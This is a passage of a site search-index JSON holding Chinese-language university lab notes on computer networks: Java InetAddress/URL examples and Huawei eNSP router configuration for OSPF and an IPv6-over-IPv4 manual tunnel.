.1.0.33 [ RouterB ] ip route-static 10 .1.20.0 24 GigabitEthernet0/0/1","title":"\u63a7\u5236\u53f0\u8bb0\u5f55"},{"location":"szu_courses/cn/router_lab/#_6","text":"\u5b9e\u9a8c\u62a5\u544a \u8def\u7531\u5668\u4e0e\u9759\u6001\u8def\u7531\u914d\u7f6e \u8ba1\u7b97\u673a\u7f51\u7edc","title":"\u5173\u952e\u8bcd"},{"location":"szu_courses/cn/socket_lab/","text":"\u5176\u5b9e\u6ca1\u5565\u597d\u5199\u7684\uff0c\u5c31\u662f\u6574\u7406\u4e00\u4e0b\u4ee3\u7801\u3002 4-1 \u4f7f\u7528InetAddress\u7c7b\u7684\u65b9\u6cd5\u83b7\u53d6\u672c\u5730\u673a\u7684\u540d\u79f0\u548cIP\u5730\u5740 \u8fd9\u4e2a\u6ca1\u5565\u597d\u8bf4\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package ipAddr ; import java.net.InetAddress ; import java.net.UnknownHostException ; public class Local { public static void main ( String [] args ) { new Local (); } private Local () { try { InetAddress inetAddress = InetAddress . getLocalHost (); System . out . println ( inetAddress . getHostName ()); System . out . println ( inetAddress . getHostAddress ()); } catch ( UnknownHostException e ) { e . printStackTrace (); } } } \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 linux - 521 z 192 . 168 . 2 . 209 \u4f7f\u7528InetAddress\u7c7b\u7684\u65b9\u6cd5\u83b7\u53d6\u7f51\u7ad9www.csdn.net\u7684IP\u5730\u5740 \u5982\u679c\u5b58\u5728\u591a\u4e2aIP\u5730\u5740\uff0c\u8981\u6c42\u5168\u90e8\u8fd4\u56de\u3002 \u9053\u7406\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package ipAddr ; import java.net.InetAddress ; import java.net.UnknownHostException ; public class Remote { public static void main ( String [] args ) { new Remote ( \"www.csdn.net\" ); } private Remote ( String URL ) { try { InetAddress [] inetAddress = InetAddress . getAllByName ( URL ); for ( InetAddress i : inetAddress ) { System . out . println ( i ); } } catch ( UnknownHostException e ) { e . printStackTrace (); } } } \u53ef\u4ee5\u5f97\u5230\uff1a 1 www . csdn . net / 47 . 95 . 164 . 112 \u4f7f\u7528URL\u7c7b\u4e0b\u8f7d\u6df1\u5733\u5927\u5b66\u9996\u9875http:// www.szu.edu.cn \u5e76\u7edf\u8ba1\u4e0b\u8f7d\u5f97\u5230\u7f51\u9875\u6587\u4ef6\u7684\u5927\u5c0f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package ipAddr ; import java.io.* ; import java.net.URL ; import java.net.URLConnection ; public class Request { public static void main ( String [] args ) { new Request ( \"https://www.szu.edu.cn\" ); } private URLConnection urlConnection ; private Request ( String URL ) { try { connect ( URL ); downloadCurrentURL (); } catch ( IOException e ) { e . printStackTrace (); } } private void connect ( String URL ) throws IOException { URL url = new URL ( URL ); urlConnection = url . openConnection (); System . out . println ( urlConnection . getContentLength ()); } private void downloadCurrentURL () throws IOException { File file = new File ( \"./download.html\" ); FileOutputStream fileOutputStream = new FileOutputStream ( file ); DataInputStream dataInputStream = new DataInputStream ( urlConnection . getInputStream ()); byte [] buffer = new byte [ 1024 ]; int length , offset = 0 ; while (( length = dataInputStream . read ( buffer , offset , buffer . length )) != - 1 ) { fileOutputStream . write ( buffer , offset , length ); fileOutputStream . flush (); } } } \u63a7\u5236\u53f0\u5c06\u4f1a\u8f93\u51fa\uff1a 1 58929 \u5e76\u4e14\u4f1a\u5f97\u5230\u4e00\u4e2a download.html \u3002 4-2","title":"Socket Lab"},{"location":"szu_courses/cn/socket_lab/#4-1","text":"","title":"4-1"},{"location":"szu_courses/cn/socket_lab/#inetaddressip","text":"\u8fd9\u4e2a\u6ca1\u5565\u597d\u8bf4\u7684\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package ipAddr ; import java.net.InetAddress ; import java.net.UnknownHostException ; public class Local { public static void main ( String [] args ) { new Local (); } private Local () { try { InetAddress inetAddress = InetAddress . getLocalHost (); System . out . println ( inetAddress . getHostName ()); System . out . println ( inetAddress . getHostAddress ()); } catch ( UnknownHostException e ) { e . printStackTrace (); } } } \u53ef\u4ee5\u5f97\u5230\uff1a 1 2 linux - 521 z 192 . 168 . 2 . 209","title":"\u4f7f\u7528InetAddress\u7c7b\u7684\u65b9\u6cd5\u83b7\u53d6\u672c\u5730\u673a\u7684\u540d\u79f0\u548cIP\u5730\u5740"},{"location":"szu_courses/cn/socket_lab/#inetaddresswwwcsdnnetip","text":"\u5982\u679c\u5b58\u5728\u591a\u4e2aIP\u5730\u5740\uff0c\u8981\u6c42\u5168\u90e8\u8fd4\u56de\u3002 \u9053\u7406\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package ipAddr ; import java.net.InetAddress ; import java.net.UnknownHostException ; public class Remote { public static void main ( String [] args ) { new Remote ( \"www.csdn.net\" ); } private Remote ( String URL ) { try { InetAddress [] inetAddress = InetAddress . getAllByName ( URL ); for ( InetAddress i : inetAddress ) { System . out . println ( i ); } } catch ( UnknownHostException e ) { e . printStackTrace (); } } } \u53ef\u4ee5\u5f97\u5230\uff1a 1 www . csdn . net / 47 . 95 . 164 . 112","title":"\u4f7f\u7528InetAddress\u7c7b\u7684\u65b9\u6cd5\u83b7\u53d6\u7f51\u7ad9www.csdn.net\u7684IP\u5730\u5740"},{"location":"szu_courses/cn/socket_lab/#urlhttpwwwszueducn","text":"\u5e76\u7edf\u8ba1\u4e0b\u8f7d\u5f97\u5230\u7f51\u9875\u6587\u4ef6\u7684\u5927\u5c0f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 package ipAddr ; import java.io.* ; import java.net.URL ; import java.net.URLConnection ; public class Request { public static void main ( String [] args ) { new Request ( \"https://www.szu.edu.cn\" ); } private URLConnection urlConnection ; private Request ( String URL ) { try { connect ( URL ); downloadCurrentURL (); } catch ( IOException e ) { e . printStackTrace (); } } private void connect ( String URL ) throws IOException { URL url = new URL ( URL ); urlConnection = url . openConnection (); System . out . println ( urlConnection . getContentLength ()); } private void downloadCurrentURL () throws IOException { File file = new File ( \"./download.html\" ); FileOutputStream fileOutputStream = new FileOutputStream ( file ); DataInputStream dataInputStream = new DataInputStream ( urlConnection . getInputStream ()); byte [] buffer = new byte [ 1024 ]; int length , offset = 0 ; while (( length = dataInputStream . read ( buffer , offset , buffer . length )) != - 1 ) { fileOutputStream . write ( buffer , offset , length ); fileOutputStream . flush (); } } } \u63a7\u5236\u53f0\u5c06\u4f1a\u8f93\u51fa\uff1a 1 58929 \u5e76\u4e14\u4f1a\u5f97\u5230\u4e00\u4e2a download.html \u3002","title":"\u4f7f\u7528URL\u7c7b\u4e0b\u8f7d\u6df1\u5733\u5927\u5b66\u9996\u9875http://www.szu.edu.cn"},{"location":"szu_courses/cn/socket_lab/#4-2","text":"","title":"4-2"},{"location":"szu_courses/cn/tunnel_lab/","text":"IPv6 over IPv4 Tunnel Configuration \u597d\u7684...\u6211\u4eec\u6765\u76f4\u5165\u6b63\u9898\u3002\u8fd9\u6b21\u7684\u5b9e\u9a8c\u662f\u5728eNSP\u4e0a\u8fdb\u884c\u7684\uff0c\u5982\u679c\u4f60\u662f\u5728\u81ea\u5df1\u7684PC\u4e0a\u505a\u8fd9\u4e2a\u5b9e\u9a8c\u7684\u8bdd\uff0c\u4f60\u9700\u8981\u5230\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u6700\u65b0\u7248\u7684 eNSP \u3002\u53e6\u5916\uff0c\u5b83\u9700\u8981 Wireshark \u3001 WinPcap \u548c VirtualBox \u624d\u80fd\u6b63\u5e38\u8fd0\u884c\u3002 \u5176\u4e2d\uff0c WinPcap isn't supported on Windows 10 For 14 years, WinPcap was the standard libpcap package for Windows. But when Windows 10 was released without NDIS 5 support, WinPcap failed to keep up, leaving users wondering what to do. Fortunately, the Nmap Project stepped up and converted the original WinPcap to the new NDIS 6 API, giving users a fast and completely compatible alternative to WinPcap for Windows 10. Npcap is WinPcap for Windows 10 -- Npcap: WinPcap for Windows 10 \u4f60\u80fd\u770b\u5230\uff0c\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows 10\uff0c\u4f60\u9700\u8981\u5b89\u88c5Npcap\u800c\u4e0d\u662fWinPcap\u3002\u91cd\u8981\u7684\u662f\uff0c \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u522b\u5fd8\u4e86\u52fe\u9009WinPcap\u517c\u5bb9\u6a21\u5f0f \uff0c\u5426\u5219eNSP\u53ef\u80fd\u8bc6\u522b\u4e0d\u5230\u5b83\u3002 \u8fd8\u6709\uff0c\u5f53\u524d\u6211\u80fd\u83b7\u53d6\u5230\u7684eNSP\u7684\u7248\u672c\u4ec5\u652f\u6301VirtualBox 5.x\u3002\u6211\u5c1d\u8bd5\u8fc7VirtualBox 6.0\uff0c\u4f46\u662f\u542f\u52a8\u8def\u7531\u5668\u7684\u65f6\u5019\u603b\u662f\u5931\u8d25\uff0c\u540e\u7eed\u7248\u672c\u6216\u8bb8\u4f1a\u4fee\u6b63\u8fd9\u4e00\u70b9\u3002 \u5b9e\u9a8c\u8981\u6c42 \u6211\u7ee7\u7eed\u6458\u6284\u4e00\u4e0b... \u5b89\u88c5\u548c\u914d\u7f6e\u534e\u4e3aeNSP\u7f51\u7edc\u4eff\u771f\u8f6f\u4ef6 \u719f\u6089eNSP\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u8fdb\u884c\u7b80\u5355\u7684\u7f51\u7edc\u547d\u4ee4\u7ec3\u4e60 \u6839\u636e\u5df2\u7ed9\u62d3\u6251\uff0c\u5b9e\u73b0IPv6-over-IPv4\u624b\u5de5\u96a7\u9053\u7684\u914d\u7f6e \uff0c\u8fbe\u5230IPv6\u6570\u636e\u5305\u901a\u8fc7IPv4\u7f51\u7edc\u901a\u4fe1\u7684\u76ee\u7684 \u8fd8\u6709\uff1a IPv6 over IPv4\u96a7\u9053\u6280\u672f\uff1a\u901a\u8fc7\u96a7\u9053\u6280\u672f\uff0c\u4f7fIPv6\u62a5\u6587\u5728IPv4\u7f51\u7edc\u4e2d\u4f20\u8f93\uff0c\u5b9e\u73b0IPv6\u7f51\u7edc\u4e4b\u95f4\u7684\u5b64\u5c9b\u4e92\u8fde IPv6 over IPv4\u96a7\u9053\u5206\u7c7b\uff1a\u624b\u52a8\u96a7\u9053\u5305\u62ec\u624b\u52a8\u96a7\u9053\u548cGRE\u96a7\u9053 \u624b\u52a8\u96a7\u9053\uff1aIPv6 over IPv4\u96a7\u9053\u624b\u52a8\u96a7\u9053\u7684\u4e00\u79cd\uff0c\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u5747\u9700\u624b\u5de5\u6307\u5b9a\uff0c\u7528\u4e8e\u8fb9\u754c\u8def\u7531\u5668\u4e0e\u8fb9\u754c\u8def\u7531\u5668\uff0c\u6216\u8005\u4e3b\u673a\u4e0e\u8fb9\u754c\u8def\u7531\u5668\u4e4b\u95f4\u3002 \u8fd9\u4e2a\u91cd\u8981\u7684\uff1a \u516c\u53f8A\u7f51\u7edc\u62d3\u6251\u5982\u4e0b\u6240\u793a\uff0c\u73b0\u6839\u636e\u9700\u6c42\u5b8c\u6210\u5982\u4e0b\u914d\u7f6e\uff1a R1\u3001R2\u548cR3\u7684IPv4\u5730\u5740\u5982\u56fe\u6240\u793a\uff0c\u90e8\u7f72\u5728OSPFv2\u7684\u533a\u57df0\u4e2d\uff0c\u8be5\u90e8\u5206\u914d\u7f6e\u5e94\u9996\u5148\u5b8c\u6210\uff1b \u6240\u9700\u7684IPv6\u5730\u5740\u5df2\u7ecf\u6807\u51fa\uff1b \u91c7\u7528IPv6 over IPv4\u624b\u52a8\u96a7\u9053\u7684\u5f62\u5f0f\uff0c\u5b9e\u73b0R1\u4e0eR3\u7684Loopback1\u4e4b\u95f4\u7684\u4e92\u901a\u3002 \u6765\u5c1d\u8bd5\u4e00\u4e0b \u7b2c\u4e00\u90e8\u5206\u4ec5\u4ec5\u53ea\u662f\u8bbe\u7f6e\u4e00\u4e0b\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u548cPC\uff0c\u5dee\u4e0d\u591a\u5c31\u662f\u4e2a\u719f\u6089\u8f6f\u4ef6\u7684\u8fc7\u7a0b\uff0c\u8fd9\u8fb9\u5c31\u4e0d\u591a\u8bf4\u4ec0\u4e48\u4e86\u3002 \u63a5\u4e0b\u6765\u6709\u4e2a\u5f88\u597d\u7684\u53c2\u8003\u662f\uff1a IPv6 over IPv4 Tunnel Configuration \u7b2c\u4e8c\u90e8\u5206\u9700\u8981\u5148\u62d6\u62fd3\u53f0\u8def\u7531\u5668\u5230\u9762\u677f\u4e0a\uff0c\u7136\u540e\u6309\u7167\u56fe\u4e2d\u90a3\u6837\u8fde\u63a5\u5b83\u4eec\u3002\u5b8c\u6210\u540e\u4f60\u5c31\u53ef\u4ee5\u9009\u4e2d\u5b83\u4eec\uff0c\u7136\u540e\u542f\u52a8\u3002 \u4e00\u4e9b\u51c6\u5907 \u9996\u5148\u6211\u4eec\u6765\u8bbe\u7f6eIP\u5730\u5740\u548cOSPF\u3002\u5bf9\u4e8eAR1: 1 2 3 4 5 6 7 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 12.1.1.1 24 [ Huawei-GigabitEthernet0/0/0 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 1.1.1.1 0.0.0.0 [ Huawei-ospf-1-area-0.0.0.0 ] network 12.1.1.0 0.0.0.255 \u5bf9\u4e8eAR2\uff1a 1 2 3 4 5 6 7 8 9 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 12.1.1.2 24 [ Huawei-GigabitEthernet0/0/0 ] interface GigabitEthernet 0 / 0 / 1 [ Huawei-GigabitEthernet0/0/1 ] ip addr 23.1.1.2 24 [ Huawei-GigabitEthernet0/0/1 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 12.1.1.0 0.0.0.255 [ Huawei-ospf-1-area-0.0.0.0 ] network 23.1.1.0 0.0.0.255 \u8fd8\u6709AR3\uff0c\u5176\u5b9e\u8ddfAR1\u5dee\u4e0d\u591a\uff1a 1 2 3 4 5 6 7 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 23.1.1.3 24 [ Huawei-GigabitEthernet0/0/0 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 3.3.3.3 0.0.0.0 [ Huawei-ospf-1-area-0.0.0.0 ] network 23.1.1.0 0.0.0.255 \u6bcf\u6b21\u8bbe\u7f6eOSPF\u65f6\uff0c\u4f60\u5e94\u8be5\u90fd\u80fd\u5728\u63a7\u5236\u53f0\u4e0a\u89c2\u5bdf\u5230\u90bb\u5c45\u53d8\u52a8\u7b49\u76f8\u5173\u4fe1\u606f\u3002 \u5f00\u59cb \u63a5\u4e0b\u6765\u5c31\u662f\u5bf9\u8def\u7531\u5668\u8bbe\u7f6e\u96a7\u9053\u548c\u8f6c\u53d1\u4e86\u3002\u5bf9\u4e8eAR1\uff0c\u9700\u8981\uff1a 1 2 3 4 [ Huawei - GigabitEthernet0 / 0 / 0 ] interface LoopBack 0 [ Huawei - LoopBack0 ] ip addr 1 . 1 . 1 . 1 32 [ Huawei - LoopBack0 ] interface LoopBack 1 [ Huawei - LoopBack1 ] ipv6 addr 2001 : 1 :: 1 64 \u8bf6\uff1f\u4f60\u6536\u5230\u4e00\u4e2a\u9519\u8bef\u6ca1\u6709\uff1f Tip \u5982\u679c\u4f60\u6ca1\u6709\u901a\u8fc7 ipv6 enable \u6765\u4f7f\u5f97\u67d0\u4e2a\u7aef\u53e3\u542f\u7528IPv6\uff0c\u90a3\u4e48\u4f60\u5728\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u65f6\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u770b\u8d77\u6765\u4e0d\u662f\u5f88\u76f8\u5173\u7684\u9519\u8bef Unrecognized command \u3002 \u4f60\u53ea\u9700\u8981\u5bf9\u8fd9\u4e2a\u7aef\u53e3\u6267\u884c ipv6 enable \uff0c\u518d\u8bbe\u7f6eIPv6\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002 \u4e0d\u5bf9\u554a\uff1f\u4e3a\u4ec0\u4e48\u8fd8\u662f\u63d0\u793a\u8981\u5728 system-view \u4e0b\u542f\u7528IPv6\uff1f Tip \u9700\u8981\u5728 system-view \u4e2d\u6267\u884c ipv6 \u6765\u542f\u7528IPv6\uff0c\u5426\u5219\u76f8\u5173\u529f\u80fd\u90fd\u4e0d\u4f1a\u542f\u7528\u3002 \u5728\u6ca1\u6709\u542f\u52a8\u524d\uff0c\u4f60\u5728\u8bbe\u7f6eIPv6\u76f8\u5173\u7684\u5185\u5bb9\u65f6\u90fd\u4f1a\u51fa\u73b0\u4e00\u5219\u63d0\u793a\uff08INFO\uff09\u3002 \u53ef\u4ee5\u5f00\u59cb\u6765\u6298\u817e\u96a7\u9053\u4e86\uff1a 1 2 3 4 5 6 [ Huawei - LoopBack1 ] interface tunnel 0 / 0 / 0 [ Huawei - Tunnel0 / 0 / 0 ] ipv6 enable [ Huawei - Tunnel0 / 0 / 0 ] ipv6 address 2001 : 13 :: 1 64 [ Huawei - Tunnel0 / 0 / 0 ] tunnel - protocol ipv6 - ipv4 [ Huawei - Tunnel0 / 0 / 0 ] source LoopBack 0 [ Huawei - Tunnel0 / 0 / 0 ] destination 3 . 3 . 3 . 3 \u522b\u5fd8\u4e86\u8f6c\u53d1\uff1a 1 [ Huawei ] ipv6 route - static 2001 : 3 :: 64 Tunnel 0 / 0 / 0 \u540c\u6837\u7684\u9053\u7406\u5bf9AR3\u8fdb\u884c\u8bbe\u7f6e\u5c31\u53ef\u4ee5\u4e86\u3002\u5728\u4f60\u8bbe\u7f6e\u597d\u7684\u65f6\u5019\u5e94\u8be5\u5c31\u4f1a\u5728\u63a7\u5236\u53f0\u4e0a\u770b\u5230\u7aef\u53e3\u548c\u534f\u8bae UP \u7684\u4fe1\u606f\u3002 \u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\uff1a 1 display ipv6 interface Tunnel 0 / 0 / 0 \u6765\u67e5\u770b\u5b83\u4eec\u662f\u5426\u90fd\u5df2\u7ecf\u662f UP \u72b6\u6001\u3002\u8fd9\u4e2a\u65f6\u5019\u5de5\u4f5c\u5e94\u8be5\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\u3002 \u6d4b\u8bd5 \u4f60\u5df2\u7ecf\u53ef\u4ee5\u901a\u8fc7 ping ipv6 \u6765\u6d4b\u8bd5\u7f51\u7edc\u662f\u5426\u6b63\u5e38\u5de5\u4f5c\u4e86\u3002 \u5173\u952e\u8bcd \u5b9e\u9a8c\u62a5\u544a IPv6\u96a7\u9053\u5b9e\u9a8c \u8ba1\u7b97\u673a\u7f51\u7edc","title":"Tunnel Lab"},{"location":"szu_courses/cn/tunnel_lab/#ipv6-over-ipv4-tunnel-configuration","text":"\u597d\u7684...\u6211\u4eec\u6765\u76f4\u5165\u6b63\u9898\u3002\u8fd9\u6b21\u7684\u5b9e\u9a8c\u662f\u5728eNSP\u4e0a\u8fdb\u884c\u7684\uff0c\u5982\u679c\u4f60\u662f\u5728\u81ea\u5df1\u7684PC\u4e0a\u505a\u8fd9\u4e2a\u5b9e\u9a8c\u7684\u8bdd\uff0c\u4f60\u9700\u8981\u5230\u5b98\u7f51\u4e0a\u4e0b\u8f7d\u6700\u65b0\u7248\u7684 eNSP \u3002\u53e6\u5916\uff0c\u5b83\u9700\u8981 Wireshark \u3001 WinPcap \u548c VirtualBox \u624d\u80fd\u6b63\u5e38\u8fd0\u884c\u3002 \u5176\u4e2d\uff0c WinPcap isn't supported on Windows 10 For 14 years, WinPcap was the standard libpcap package for Windows. But when Windows 10 was released without NDIS 5 support, WinPcap failed to keep up, leaving users wondering what to do. Fortunately, the Nmap Project stepped up and converted the original WinPcap to the new NDIS 6 API, giving users a fast and completely compatible alternative to WinPcap for Windows 10. Npcap is WinPcap for Windows 10 -- Npcap: WinPcap for Windows 10 \u4f60\u80fd\u770b\u5230\uff0c\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528Windows 10\uff0c\u4f60\u9700\u8981\u5b89\u88c5Npcap\u800c\u4e0d\u662fWinPcap\u3002\u91cd\u8981\u7684\u662f\uff0c \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u522b\u5fd8\u4e86\u52fe\u9009WinPcap\u517c\u5bb9\u6a21\u5f0f \uff0c\u5426\u5219eNSP\u53ef\u80fd\u8bc6\u522b\u4e0d\u5230\u5b83\u3002 \u8fd8\u6709\uff0c\u5f53\u524d\u6211\u80fd\u83b7\u53d6\u5230\u7684eNSP\u7684\u7248\u672c\u4ec5\u652f\u6301VirtualBox 5.x\u3002\u6211\u5c1d\u8bd5\u8fc7VirtualBox 6.0\uff0c\u4f46\u662f\u542f\u52a8\u8def\u7531\u5668\u7684\u65f6\u5019\u603b\u662f\u5931\u8d25\uff0c\u540e\u7eed\u7248\u672c\u6216\u8bb8\u4f1a\u4fee\u6b63\u8fd9\u4e00\u70b9\u3002","title":"IPv6 over IPv4 Tunnel Configuration"},{"location":"szu_courses/cn/tunnel_lab/#_1","text":"\u6211\u7ee7\u7eed\u6458\u6284\u4e00\u4e0b... \u5b89\u88c5\u548c\u914d\u7f6e\u534e\u4e3aeNSP\u7f51\u7edc\u4eff\u771f\u8f6f\u4ef6 \u719f\u6089eNSP\u8f6f\u4ef6\u7684\u4f7f\u7528\uff0c\u8fdb\u884c\u7b80\u5355\u7684\u7f51\u7edc\u547d\u4ee4\u7ec3\u4e60 \u6839\u636e\u5df2\u7ed9\u62d3\u6251\uff0c\u5b9e\u73b0IPv6-over-IPv4\u624b\u5de5\u96a7\u9053\u7684\u914d\u7f6e \uff0c\u8fbe\u5230IPv6\u6570\u636e\u5305\u901a\u8fc7IPv4\u7f51\u7edc\u901a\u4fe1\u7684\u76ee\u7684 \u8fd8\u6709\uff1a IPv6 over IPv4\u96a7\u9053\u6280\u672f\uff1a\u901a\u8fc7\u96a7\u9053\u6280\u672f\uff0c\u4f7fIPv6\u62a5\u6587\u5728IPv4\u7f51\u7edc\u4e2d\u4f20\u8f93\uff0c\u5b9e\u73b0IPv6\u7f51\u7edc\u4e4b\u95f4\u7684\u5b64\u5c9b\u4e92\u8fde IPv6 over IPv4\u96a7\u9053\u5206\u7c7b\uff1a\u624b\u52a8\u96a7\u9053\u5305\u62ec\u624b\u52a8\u96a7\u9053\u548cGRE\u96a7\u9053 \u624b\u52a8\u96a7\u9053\uff1aIPv6 over IPv4\u96a7\u9053\u624b\u52a8\u96a7\u9053\u7684\u4e00\u79cd\uff0c\u6e90\u5730\u5740\u548c\u76ee\u7684\u5730\u5740\u5747\u9700\u624b\u5de5\u6307\u5b9a\uff0c\u7528\u4e8e\u8fb9\u754c\u8def\u7531\u5668\u4e0e\u8fb9\u754c\u8def\u7531\u5668\uff0c\u6216\u8005\u4e3b\u673a\u4e0e\u8fb9\u754c\u8def\u7531\u5668\u4e4b\u95f4\u3002 \u8fd9\u4e2a\u91cd\u8981\u7684\uff1a \u516c\u53f8A\u7f51\u7edc\u62d3\u6251\u5982\u4e0b\u6240\u793a\uff0c\u73b0\u6839\u636e\u9700\u6c42\u5b8c\u6210\u5982\u4e0b\u914d\u7f6e\uff1a R1\u3001R2\u548cR3\u7684IPv4\u5730\u5740\u5982\u56fe\u6240\u793a\uff0c\u90e8\u7f72\u5728OSPFv2\u7684\u533a\u57df0\u4e2d\uff0c\u8be5\u90e8\u5206\u914d\u7f6e\u5e94\u9996\u5148\u5b8c\u6210\uff1b \u6240\u9700\u7684IPv6\u5730\u5740\u5df2\u7ecf\u6807\u51fa\uff1b \u91c7\u7528IPv6 over IPv4\u624b\u52a8\u96a7\u9053\u7684\u5f62\u5f0f\uff0c\u5b9e\u73b0R1\u4e0eR3\u7684Loopback1\u4e4b\u95f4\u7684\u4e92\u901a\u3002","title":"\u5b9e\u9a8c\u8981\u6c42"},{"location":"szu_courses/cn/tunnel_lab/#_2","text":"\u7b2c\u4e00\u90e8\u5206\u4ec5\u4ec5\u53ea\u662f\u8bbe\u7f6e\u4e00\u4e0b\u8def\u7531\u5668\u3001\u4ea4\u6362\u673a\u548cPC\uff0c\u5dee\u4e0d\u591a\u5c31\u662f\u4e2a\u719f\u6089\u8f6f\u4ef6\u7684\u8fc7\u7a0b\uff0c\u8fd9\u8fb9\u5c31\u4e0d\u591a\u8bf4\u4ec0\u4e48\u4e86\u3002 \u63a5\u4e0b\u6765\u6709\u4e2a\u5f88\u597d\u7684\u53c2\u8003\u662f\uff1a IPv6 over IPv4 Tunnel Configuration \u7b2c\u4e8c\u90e8\u5206\u9700\u8981\u5148\u62d6\u62fd3\u53f0\u8def\u7531\u5668\u5230\u9762\u677f\u4e0a\uff0c\u7136\u540e\u6309\u7167\u56fe\u4e2d\u90a3\u6837\u8fde\u63a5\u5b83\u4eec\u3002\u5b8c\u6210\u540e\u4f60\u5c31\u53ef\u4ee5\u9009\u4e2d\u5b83\u4eec\uff0c\u7136\u540e\u542f\u52a8\u3002","title":"\u6765\u5c1d\u8bd5\u4e00\u4e0b"},{"location":"szu_courses/cn/tunnel_lab/#_3","text":"\u9996\u5148\u6211\u4eec\u6765\u8bbe\u7f6eIP\u5730\u5740\u548cOSPF\u3002\u5bf9\u4e8eAR1: 1 2 3 4 5 6 7 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 12.1.1.1 24 [ Huawei-GigabitEthernet0/0/0 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 1.1.1.1 0.0.0.0 [ Huawei-ospf-1-area-0.0.0.0 ] network 12.1.1.0 0.0.0.255 \u5bf9\u4e8eAR2\uff1a 1 2 3 4 5 6 7 8 9 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 12.1.1.2 24 [ Huawei-GigabitEthernet0/0/0 ] interface GigabitEthernet 0 / 0 / 1 [ Huawei-GigabitEthernet0/0/1 ] ip addr 23.1.1.2 24 [ Huawei-GigabitEthernet0/0/1 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 12.1.1.0 0.0.0.255 [ Huawei-ospf-1-area-0.0.0.0 ] network 23.1.1.0 0.0.0.255 \u8fd8\u6709AR3\uff0c\u5176\u5b9e\u8ddfAR1\u5dee\u4e0d\u591a\uff1a 1 2 3 4 5 6 7 < Huawei > system - view [ Huawei ] interface GigabitEthernet 0 / 0 / 0 [ Huawei-GigabitEthernet0/0/0 ] ip addr 23.1.1.3 24 [ Huawei-GigabitEthernet0/0/0 ] ospf [ Huawei-ospf-1 ] area 0 [ Huawei-ospf-1-area-0.0.0.0 ] network 3.3.3.3 0.0.0.0 [ Huawei-ospf-1-area-0.0.0.0 ] network 23.1.1.0 0.0.0.255 \u6bcf\u6b21\u8bbe\u7f6eOSPF\u65f6\uff0c\u4f60\u5e94\u8be5\u90fd\u80fd\u5728\u63a7\u5236\u53f0\u4e0a\u89c2\u5bdf\u5230\u90bb\u5c45\u53d8\u52a8\u7b49\u76f8\u5173\u4fe1\u606f\u3002","title":"\u4e00\u4e9b\u51c6\u5907"},{"location":"szu_courses/cn/tunnel_lab/#_4","text":"\u63a5\u4e0b\u6765\u5c31\u662f\u5bf9\u8def\u7531\u5668\u8bbe\u7f6e\u96a7\u9053\u548c\u8f6c\u53d1\u4e86\u3002\u5bf9\u4e8eAR1\uff0c\u9700\u8981\uff1a 1 2 3 4 [ Huawei - GigabitEthernet0 / 0 / 0 ] interface LoopBack 0 [ Huawei - LoopBack0 ] ip addr 1 . 1 . 1 . 1 32 [ Huawei - LoopBack0 ] interface LoopBack 1 [ Huawei - LoopBack1 ] ipv6 addr 2001 : 1 :: 1 64 \u8bf6\uff1f\u4f60\u6536\u5230\u4e00\u4e2a\u9519\u8bef\u6ca1\u6709\uff1f Tip \u5982\u679c\u4f60\u6ca1\u6709\u901a\u8fc7 ipv6 enable \u6765\u4f7f\u5f97\u67d0\u4e2a\u7aef\u53e3\u542f\u7528IPv6\uff0c\u90a3\u4e48\u4f60\u5728\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u65f6\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u770b\u8d77\u6765\u4e0d\u662f\u5f88\u76f8\u5173\u7684\u9519\u8bef Unrecognized command \u3002 \u4f60\u53ea\u9700\u8981\u5bf9\u8fd9\u4e2a\u7aef\u53e3\u6267\u884c ipv6 enable \uff0c\u518d\u8bbe\u7f6eIPv6\u5730\u5740\u5c31\u53ef\u4ee5\u4e86\u3002 